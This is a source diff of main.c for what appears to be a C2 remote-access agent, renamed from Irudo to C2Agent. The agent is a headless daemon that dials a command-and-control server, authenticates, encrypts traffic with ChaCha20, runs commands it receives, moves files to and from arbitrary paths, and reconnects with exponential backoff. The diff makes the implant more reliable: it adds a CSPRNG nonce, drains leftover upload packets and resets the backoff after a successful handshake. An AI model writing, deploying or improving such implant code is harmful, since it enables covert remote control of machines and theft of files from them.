@@ -1,4 +1,4 @@
-/* main.c - Irudo C remote agent entry point.
+/* main.c - C2Agent C remote agent entry point.
  * Headless daemon: dials the C2, registers, heartbeats, and serves
  * action / file-transfer commands. Reconnects with exponential backoff.
  */
@@ -81,9 +81,9 @@ static int parse_c2_address(const char *addr, char **host, int *port) {
 }
 
 static void load_config_file(const char *path, opts *o) {
-    FILE *f = iru_fopen(path, "rb");
+    FILE *f = c2a_fopen(path, "rb");
     if (!f) {
-        fprintf(stderr, "[irudo] warning: cannot open config file: %s\n", path);
+        fprintf(stderr, "[c2agent] warning: cannot open config file: %s\n", path);
         return;
     }
     fseek(f, 0, SEEK_END);
@@ -143,12 +143,12 @@ static int parse_args(int argc, char **argv, opts *o) {
         const char *a = argv[i];
         if (!strcmp(a, "--help") || !strcmp(a, "-h")) return 1;
         if (a[0] != '-' || a[1] != '-') {
-            fprintf(stderr, "[irudo] unexpected argument: %s\n", a);
+            fprintf(stderr, "[c2agent] unexpected argument: %s\n", a);
             return -1;
         }
         const char *name = a + 2;
         if (i + 1 >= argc) {
-            fprintf(stderr, "[irudo] missing value for %s\n", a);
+            fprintf(stderr, "[c2agent] missing value for %s\n", a);
             return -1;
         }
         const char *val = argv[++i];
@@ -159,7 +159,7 @@ static int parse_args(int argc, char **argv, opts *o) {
             char *h = NULL;
             int p = 0;
             if (parse_c2_address(val, &h, &p) != 0) {
-                fprintf(stderr, "[irudo] invalid c2-address: %s (expected host:port)\n", val);
+                fprintf(stderr, "[c2agent] invalid c2-address: %s (expected host:port)\n", val);
                 return -1;
             }
             free(o->c2_host);
@@ -180,7 +180,7 @@ static int parse_args(int argc, char **argv, opts *o) {
         } else if (!strcmp(name, "reconnect-max")) {
             o->reconnect_max = atoi(val);
         } else {
-            fprintf(stderr, "[irudo] unknown option: %s\n", a);
+            fprintf(stderr, "[c2agent] unknown option: %s\n", a);
             return -1;
         }
     }
@@ -224,10 +224,23 @@ static void gen_nonce(char *out, size_t outsz) {
     unsigned char buf[16];
     int i;
 #ifdef _WIN32
-    uint64_t seed = ((uint64_t)time(NULL) << 32) ^ (uint64_t)GetTickCount64();
-    for (i = 0; i < 16; i++) {
-        seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
-        buf[i] = (unsigned char)(seed >> 33);
+    /* Prefer the OS CSPRNG (bcrypt), loaded dynamically so no extra import
+     * library is required; fall back to the tick-based LCG only if unavailable. */
+    int filled = 0;
+    HMODULE h = LoadLibraryA("bcrypt.dll");
+    if (h) {
+        typedef LONG (WINAPI *bcrypt_gen_fn)(void *, unsigned char *, unsigned long, unsigned long);
+        bcrypt_gen_fn gen = (bcrypt_gen_fn)(void *)GetProcAddress(h, "BCryptGenRandom");
+        /* BCRYPT_USE_SYSTEM_PREFERRED_RNG = 0x00000002 */
+        if (gen && gen(NULL, buf, (unsigned long)sizeof buf, 0x00000002UL) == 0) filled = 1;
+        FreeLibrary(h);
+    }
+    if (!filled) {
+        uint64_t seed = ((uint64_t)time(NULL) << 32) ^ (uint64_t)GetTickCount64();
+        for (i = 0; i < 16; i++) {
+            seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
+            buf[i] = (unsigned char)(seed >> 33);
+        }
     }
 #else
     int filled = 0;
@@ -278,11 +291,11 @@ static int auth_handshake(sockfd_t sock, const opts *o, bytebuf_t *inbuf) {
     const uint8_t *body;
     uint32_t blen;
     if (take_packet_blocking(sock, inbuf, &req_id, &cmd, &body, &blen, 15000) <= 0) {
-        fprintf(stderr, "[irudo] no register_response from C2\n");
+        fprintf(stderr, "[c2agent] no register_response from C2\n");
         return -1;
     }
     if (cmd != CMD_REGISTER_RESPONSE) {
-        fprintf(stderr, "[irudo] expected register_response, got cmd=%#x\n", cmd);
+        fprintf(stderr, "[c2agent] expected register_response, got cmd=%#x\n", cmd);
         return -1;
     }
 
@@ -301,7 +314,7 @@ static int auth_handshake(sockfd_t sock, const opts *o, bytebuf_t *inbuf) {
     free(joined);
 
     if (strcmp(local, expected) != 0) {
-        fprintf(stderr, "[irudo] auth verification failed (token mismatch)\n");
+        fprintf(stderr, "[c2agent] auth verification failed (token mismatch)\n");
         return -1;
     }
 
@@ -351,20 +364,38 @@ static int send_response_pkt(sockfd_t sock, uint64_t req_id, uint8_t cmd,
 /* file transfer                                                         */
 /* ===================================================================== */
 
+/* Drop the rest of an upload's data packets so they are never parsed as
+ * commands by the serve loop. Bounded by timeout_ms per packet. */
+static void drain_upload(sockfd_t sock, bytebuf_t *inbuf, uint64_t req_id, int timeout_ms) {
+    for (;;) {
+        uint64_t rid;
+        uint8_t c;
+        const uint8_t *b;
+        uint32_t l;
+        int have = take_packet_blocking(sock, inbuf, &rid, &c, &b, &l, timeout_ms);
+        if (have <= 0) return;
+        if (c >= 0x80) continue;   /* skip control packets */
+        if (rid != req_id) return; /* unrelated packet: stop */
+        if (c == END_FLAG_LAST) return;
+        if (c != END_FLAG_CONTINUE) return;
+    }
+}
+
 static int handle_upload(sockfd_t sock, bytebuf_t *inbuf, uint64_t req_id,
                          const uint8_t *body, uint32_t blen, int timeout_ms) {
     char **params = NULL;
     int n = 0;
     if (tlv_decode(body, blen, &params, &n) != 0 || n < 1) {
-        send_response_pkt(sock, req_id, CMD_UPLOAD, "Error: missing dest_path", 23);
+        send_response_pkt(sock, req_id, CMD_UPLOAD, "Error: missing dest_path", strlen("Error: missing dest_path"));
         tlv_free(params, n);
         return 0;
     }
     const char *dest = params[0];
     make_parent_dirs(dest);
-    FILE *f = iru_fopen(dest, "wb");
+    FILE *f = c2a_fopen(dest, "wb");
     if (!f) {
         char *err = printf_str("Error: cannot create file: %s", strerror(errno));
+        drain_upload(sock, inbuf, req_id, timeout_ms);
         send_response_pkt(sock, req_id, CMD_UPLOAD, err, strlen(err));
         free(err);
         tlv_free(params, n);
@@ -391,12 +422,13 @@ static int handle_upload(sockfd_t sock, bytebuf_t *inbuf, uint64_t req_id,
     fclose(f);
     tlv_free(params, n);
     if (ok) {
-        char *msg = printf_str("Successfully uploaded: %s (%" IRU_ULL " bytes)", dest, total);
+        char *msg = printf_str("Successfully uploaded: %s (%" C2A_ULL " bytes)", dest, total);
         send_response_pkt(sock, req_id, CMD_UPLOAD, msg, strlen(msg));
         free(msg);
     } else {
-        iru_remove(dest);
-        send_response_pkt(sock, req_id, CMD_UPLOAD, "Error: upload failed", 20);
+        c2a_remove(dest);
+        drain_upload(sock, inbuf, req_id, timeout_ms);
+        send_response_pkt(sock, req_id, CMD_UPLOAD, "Error: upload failed", strlen("Error: upload failed"));
     }
     return 0;
 }
@@ -406,7 +438,7 @@ static int handle_download(sockfd_t sock, uint64_t req_id,
     char **params = NULL;
     int n = 0;
     if (tlv_decode(body, blen, &params, &n) != 0 || n < 1) {
-        send_response_pkt(sock, req_id, CMD_DOWNLOAD, "Error: missing src_path", 23);
+        send_response_pkt(sock, req_id, CMD_DOWNLOAD, "Error: missing src_path", strlen("Error: missing src_path"));
         tlv_free(params, n);
         return 0;
     }
@@ -425,7 +457,7 @@ static int handle_download(sockfd_t sock, uint64_t req_id,
         tlv_free(params, n);
         return 0;
     }
-    FILE *f = iru_fopen(src, "rb");
+    FILE *f = c2a_fopen(src, "rb");
     if (!f) {
         char *err = printf_str("Error: cannot open source: %s", strerror(errno));
         send_response_pkt(sock, req_id, CMD_DOWNLOAD, err, strlen(err));
@@ -482,12 +514,12 @@ static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdow
     }
     if (cmd == CMD_HEARTBEAT_ACK) return 0;
     if (cmd == CMD_REGISTER_RESPONSE) {
-        fprintf(stderr, "[irudo] register_response: %.*s\n", (int)blen, (const char *)body);
+        fprintf(stderr, "[c2agent] register_response: %.*s\n", (int)blen, (const char *)body);
         return 0;
     }
     if (cmd == CMD_DISCONNECT) return -1;
     if (cmd == CMD_SHUTDOWN) {
-        send_response_pkt(sock, req_id, CMD_SHUTDOWN, "ok", 2);
+        send_response_pkt(sock, req_id, CMD_SHUTDOWN, "ok", strlen("ok"));
         *shutdown_flag = 1;
         return 1;
     }
@@ -501,7 +533,7 @@ static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdow
         char **params = NULL;
         int n = 0;
         if (tlv_decode(body, blen, &params, &n) != 0) {
-            send_response_pkt(sock, req_id, cmd, "Error: bad TLV", 13);
+            send_response_pkt(sock, req_id, cmd, "Error: bad TLV", strlen("Error: bad TLV"));
             return 0;
         }
         char *result = run_action(cmd, params, n, o->cmd_timeout);
@@ -510,7 +542,7 @@ static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdow
         free(result);
         return 0;
     }
-    send_response_pkt(sock, req_id, cmd, "Error: Unknown cmd", 17);
+    send_response_pkt(sock, req_id, cmd, "Error: Unknown cmd", strlen("Error: Unknown cmd"));
     return 0;
 }
 
@@ -543,7 +575,8 @@ static int serve(sockfd_t sock, const opts *o, bytebuf_t *inbuf, int *shutdown_f
             last_hb = now_ms();
             continue;
         }
-        int sel = wait_sock(sock, (int)wait_ms);
+        int wait_int = wait_ms > 2000000000 ? 2000000000 : (int)wait_ms;
+        int sel = wait_sock(sock, wait_int);
         if (sel > 0) {
             int r = recv_more(sock, inbuf);
             if (r <= 0) { ret = -1; break; }
@@ -558,6 +591,11 @@ static int serve(sockfd_t sock, const opts *o, bytebuf_t *inbuf, int *shutdown_f
     return ret;
 }
 
+static double next_delay(double d, double max) {
+    double nd = d * 2.0;
+    return nd > max ? max : nd;
+}
+
 static int run(const opts *o) {
     int shutdown_flag = 0;
     double delay = (double)o->reconnect_initial;
@@ -565,13 +603,13 @@ static int run(const opts *o) {
     while (!shutdown_flag) {
         sockfd_t sock = tcp_connect(o->c2_host, o->c2_port);
         if (sock == SOCK_ERR) {
-            fprintf(stderr, "[irudo] connect to %s:%d failed; retry in %.0fs\n",
+            fprintf(stderr, "[c2agent] connect to %s:%d failed; retry in %.0fs\n",
                     o->c2_host, o->c2_port, delay);
             sleep_sec(delay);
-            if (delay * 2 <= (double)o->reconnect_max) delay *= 2;
+            delay = next_delay(delay, (double)o->reconnect_max);
             continue;
         }
-        fprintf(stderr, "[irudo] connected to %s:%d\n", o->c2_host, o->c2_port);
+        fprintf(stderr, "[c2agent] connected to %s:%d\n", o->c2_host, o->c2_port);
         /* Reset any leftover encryption state from a previous connection; the
          * register packet must be sent in plaintext. auth_handshake re-enables
          * ChaCha20 once the challenge is verified (before the confirm). */
@@ -581,21 +619,24 @@ static int run(const opts *o) {
         if (auth_handshake(sock, o, &inbuf) != 0) {
             bb_free(&inbuf);
             sock_close(sock);
-            fprintf(stderr, "[irudo] registration handshake failed; retry in %.0fs\n", delay);
+            fprintf(stderr, "[c2agent] registration handshake failed; retry in %.0fs\n", delay);
             sleep_sec(delay);
-            if (delay * 2 <= (double)o->reconnect_max) delay *= 2;
+            delay = next_delay(delay, (double)o->reconnect_max);
             continue;
         }
+        /* Successful handshake: reset the backoff. */
+        delay = (double)o->reconnect_initial;
+        if (delay < 1.0) delay = 1.0;
         int ret = serve(sock, o, &inbuf, &shutdown_flag);
         bb_free(&inbuf);
         sock_close(sock);
         if (shutdown_flag) {
-            fprintf(stderr, "[irudo] shutdown received, exiting\n");
+            fprintf(stderr, "[c2agent] shutdown received, exiting\n");
             break;
         }
-        fprintf(stderr, "[irudo] connection closed (ret=%d); retry in %.0fs\n", ret, delay);
+        fprintf(stderr, "[c2agent] connection closed (ret=%d); retry in %.0fs\n", ret, delay);
         sleep_sec(delay);
-        if (delay * 2 <= (double)o->reconnect_max) delay *= 2;
+        delay = next_delay(delay, (double)o->reconnect_max);
     }
     return 0;
 }
@@ -657,14 +698,14 @@ int main(int argc, char **argv) {
     if (rc < 0) return 2;
 
     if (!o.c2_host || !o.agent_id || !o.auth_token) {
-        fprintf(stderr, "[irudo] missing required config: c2_address, agent_id, auth_token\n");
-        fprintf(stderr, "[irudo] provide via --c2-address / --agent-id / --auth-token or a config file\n");
+        fprintf(stderr, "[c2agent] missing required config: c2_address, agent_id, auth_token\n");
+        fprintf(stderr, "[c2agent] provide via --c2-address / --agent-id / --auth-token or a config file\n");
         return 1;
     }
     if (o.heartbeat_interval < 1) o.heartbeat_interval = 1;
     if (o.cmd_timeout < 1) o.cmd_timeout = 1;
 
-    fprintf(stderr, "[irudo] agent '%s' starting; C2=%s:%d (heartbeat=%ds, cmd_timeout=%ds)\n",
+    fprintf(stderr, "[c2agent] agent '%s' starting; C2=%s:%d (heartbeat=%ds, cmd_timeout=%ds)\n",
             o.agent_id, o.c2_host, o.c2_port, o.heartbeat_interval, o.cmd_timeout);
     int r = run(&o);
 
